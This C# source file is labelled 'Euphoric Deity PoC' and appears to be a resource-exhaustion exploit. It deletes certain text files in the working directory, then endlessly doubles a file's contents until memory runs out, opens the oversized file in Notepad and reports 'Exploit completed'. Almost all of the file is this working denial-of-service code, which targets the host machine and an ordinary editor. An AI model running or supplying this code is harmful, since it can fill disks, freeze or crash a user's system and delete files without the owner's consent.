using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EuphoricDeity
{
    class Program
    {
        static void Main(string[] args)
        {
            int x = 0;
            if (File.Exists("vector.txt")) { File.Delete("vector.txt"); }
            if (File.Exists("vector2.txt")) { File.Delete("vector2.txt"); }
            if (File.Exists("vector3.txt")) { File.Delete("vector3.txt"); }
            if (File.Exists("finalVector.txt")) { File.Delete("finalVector.txt"); }
            File.Create("vector.txt").Close();
            File.WriteAllText("vector.txt", "A");
            Console.WriteLine("Euphoric Deity PoC");
            Console.WriteLine("Name meaning: Overexcited God");
            Console.WriteLine("PROOF OF CONCEPT ONLY, PRESS ANY KEY TO BEGIN");
            Console.ReadKey();
            Console.WriteLine("\nBegun.");
            while(true)
            {
                try
                {
                    string origin = File.ReadAllText("vector.txt");
                    File.WriteAllText("vector.txt", origin + origin);
                }
                catch(OutOfMemoryException)
                {
                    if (x == 0)
                    {
                        System.Diagnostics.ProcessStartInfo g = new System.Diagnostics.ProcessStartInfo("notepad.exe",
                        Environment.CurrentDirectory + "/vector.txt");
                        System.Diagnostics.Process.Start(g);
                        Console.WriteLine("Exploit completed...");
                        x++;
                    }
                }
            }
        }
        public static void concat()
        {
            const int chunkSize = 2 * 1024;
            var inputFiles = new[] { "vector.txt", "vector2.txt" };
            using (var output = File.Create("finalVector.txt"))
            {
                foreach (var file in inputFiles)
                {
                    using (var input = File.OpenRead(file))
                    {
                        var buffer = new byte[chunkSize];
                        int bytesRead;
                        while ((bytesRead = input.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            output.Write(buffer, 0, bytesRead);
                        }
                    }
                }
            }
        }
    }
}
